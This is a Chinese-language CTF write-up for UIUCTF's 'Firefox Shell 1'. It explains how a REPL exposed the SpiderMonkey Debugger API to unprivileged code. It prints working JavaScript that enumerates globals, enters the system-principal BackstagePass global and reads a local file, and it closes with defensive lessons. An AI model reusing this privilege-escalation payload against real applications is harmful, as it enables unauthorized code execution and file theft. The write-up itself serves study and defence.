# Firefox Shell 1

## 题目简述

题目把 Node.js 风格的 REPL 和 pretty-printer 移植到 Firefox XUL 应用。用户输入在普通 `about:blank` principal/compartment 中执行，本身没有系统权限；但 REPL 的 `.debug` 命令会把 SpiderMonkey `Debugger` 构造器暴露到这个非特权全局。

第一题启动时没有 `--hardened`，所以 `Debugger.prototype.findAllGlobals`、`addAllGlobalsAsDebuggees` 等跨全局枚举能力仍然存在。只要找到 Firefox 的系统权限全局 `BackstagePass`，就能在其中执行特权 JavaScript 并读取 `/flag`。

## 解题过程

先在 REPL 中输入：

```text
.debug
```

`repl.js` 会在目标 principal 下创建带 Debugger API 的 sandbox，并把其 `Debugger` 构造器挂到当前 `window`。随后建立调试器并枚举进程内全部全局对象：

```javascript
const debuggerObj = new Debugger();

let privilegedGlobal;
for (const candidate of debuggerObj.findAllGlobals()) {
  if (candidate.class === 'BackstagePass') {
    privilegedGlobal = candidate;
    break;
  }
}
```

`BackstagePass` 代表具有 system principal 的 privileged global。`Debugger.Object.executeInGlobal` 可以让字符串在该全局中执行。官方 payload 在其中导入 `fetch`，通过 `file:///flag` 读取本地文件，再调用 REPL 已有的 `inspect` 把内容写回输出：

```javascript
privilegedGlobal.executeInGlobal(
  '(' +
    async function () {
      Cu.importGlobalProperties(['fetch']);
      const { inspect } = ChromeUtils.import(
        'resource:///modules/ConsoleObserver.jsm'
      );
      const response = await fetch('file:///flag');
      inspect(await response.text(), false, globalThis);
    } +
  ')()'
);
```

这里不是传统的浏览器同源绕过：真正的权限提升发生在 Debugger API 从普通网页 compartment 枚举并进入 system-principal global。读取结果为：

```text
uiuctf{why_mozilla_why_docs_either_deleted_or_bad_3466658a}
```

## 方法总结

- 核心技巧：滥用暴露给非特权代码的 SpiderMonkey Debugger API，枚举 `BackstagePass` 并在系统权限全局执行代码。
- 识别信号：应用在同一进程中混合网页 principal 与 XUL/Chrome 特权代码，同时向低权限 REPL 暴露 `findAllGlobals` 或任意 debuggee 管理能力。
- 复用要点：调试 API 本身就是 capability，不能只依赖 compartment 隔离；应按 principal 限制可调试对象，并确保低权限环境无法获得任何能枚举、解引用或执行于系统全局的 Debugger 对象。
